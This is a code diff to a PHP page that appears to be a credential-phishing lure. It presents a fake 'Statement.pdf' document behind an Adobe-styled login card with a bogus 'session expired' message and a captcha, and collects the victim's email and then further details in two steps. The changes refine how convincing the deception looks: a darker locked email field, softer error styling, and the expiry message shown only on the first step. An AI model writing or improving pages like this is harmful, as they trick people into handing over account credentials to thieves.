@@ -39,6 +39,7 @@ $hasError = !empty($error);
             --btn-hover: #185abc;
             --error: #c21515;
             --overlay-dark: rgba(0,0,0,0.65);
+            --readonly-bg: #e0e3ea; /* darker locked email bg */
         }
 
         @media (prefers-color-scheme: dark) {
@@ -50,6 +51,7 @@ $hasError = !empty($error);
                 --btn-bg: #3478f6;
                 --btn-hover: #1f5fcc;
                 --overlay-dark: rgba(0,0,0,0.72);
+                --readonly-bg: #252a33;
             }
         }
 
@@ -101,30 +103,29 @@ $hasError = !empty($error);
         }
 
         /* -------------------------------------------
-           CARD (reverted to compact width)
+           CARD (compact, Adobe-ish)
         -------------------------------------------- */
         .login-card {
             position: relative;
             z-index: 2;
             width: 95%;
-            max-width: 320px;  /* back to previous compact size */
+            max-width: 320px;
             background: var(--card-bg);
             border-radius: 6px;
             padding: 22px 22px 26px;
             box-shadow: 0 18px 45px rgba(0,0,0,0.45);
             overflow: hidden;
 
-            /* Entrance animation */
             opacity: 0;
             transform: translateY(14px) scale(0.98);
             animation: cardIn 0.55s ease-out forwards;
-            border: 1px solid transparent; /* default, no error */
+            border: 1px solid transparent;
         }
 
-        /* Subtle red border when there is an error */
+        /* Softer error state: subtle red border, no heavy red glow */
         .login-card.has-error {
-            border-color: rgba(194, 21, 21, 0.55);
-            box-shadow: 0 18px 45px rgba(194, 21, 21, 0.35);
+            border-color: rgba(194, 21, 21, 0.5);
+            box-shadow: 0 18px 45px rgba(0,0,0,0.55);
         }
 
         @keyframes cardIn {
@@ -169,7 +170,7 @@ $hasError = !empty($error);
             font-size: 12px;
         }
 
-        /* Red “session expired” text */
+        /* Red “session expired” text – used ONLY on step 1 */
         .doc-subtitle {
             text-align: center;
             color: var(--error);
@@ -208,32 +209,11 @@ $hasError = !empty($error);
             box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
         }
 
-        /* Read-only (validated) email appearance */
-        .validated-row {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .validated-row input.readonly-input {
-            flex: 1;
-        }
-
+        /* Read-only (validated) email appearance – darker */
         .readonly-input {
-            background: #f1f3f4;       /* changed background color */
+            background: var(--readonly-bg);
             color: var(--subtext);
             cursor: not-allowed;
-        }
-
-        .validated-badge {
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 999px;
-            background: #e6f4ea;
-            color: #137333;
-            font-weight: 600;
-            border: 1px solid #cde9d7;
-            white-space: nowrap;
         }
 
         /* CAPTCHA wrapper: perfectly centered */
@@ -244,7 +224,7 @@ $hasError = !empty($error);
             margin: 6px 0 4px;
         }
 
-        /* Turnstile size (still clean for this card) */
+        /* Turnstile size */
         .cf-turnstile {
             transform: scale(0.9);
             transform-origin: center center;
@@ -284,7 +264,11 @@ $hasError = !empty($error);
         <h2 class="doc-title">
             Statement.pdf <span class="doc-size">(197 KB)</span>
         </h2>
-        <p class="doc-subtitle">Previous session has expired, login to continue.</p>
+
+        <?php if ($step == 1): ?>
+            <!-- Only show this on the first page -->
+            <p class="doc-subtitle">Previous session has expired, login to continue.</p>
+        <?php endif; ?>
 
         <?php if ($error): ?>
             <p class="login-error"><?= htmlspecialchars($error) ?></p>
@@ -293,7 +277,6 @@ $hasError = !empty($error);
         <?php if ($step == 1): ?>
             <!-- STEP 1 — EMAIL → CAPTCHA → BUTTON -->
             <form method="POST" action="login.php">
-                <!-- EMAIL FIELD -->
                 <div class="field-wrapper">
                     <input
                         type="email"
@@ -304,7 +287,6 @@ $hasError = !empty($error);
                     >
                 </div>
 
-                <!-- CAPTCHA CENTERED -->
                 <div class="captcha-wrapper">
                     <div
                         class="cf-turnstile"
@@ -312,21 +294,19 @@ $hasError = !empty($error);
                     </div>
                 </div>
 
-                <!-- BUTTON -->
                 <button class="btn-primary">Next</button>
             </form>
 
         <?php else: ?>
-            <!-- STEP 2 — LOCKED EMAIL + VALIDATED BADGE + NAME -->
+            <!-- STEP 2 — DARKER LOCKED EMAIL + NAME -->
             <form method="POST" action="login.php">
-                <div class="field-wrapper validated-row">
+                <div class="field-wrapper">
                     <input
                         type="email"
                         value="<?= htmlspecialchars($old_email) ?>"
                         class="readonly-input"
                         readonly
                     >
-                    <span class="validated-badge">Validated</span>
                 </div>
 
                 <div class="field-wrapper">
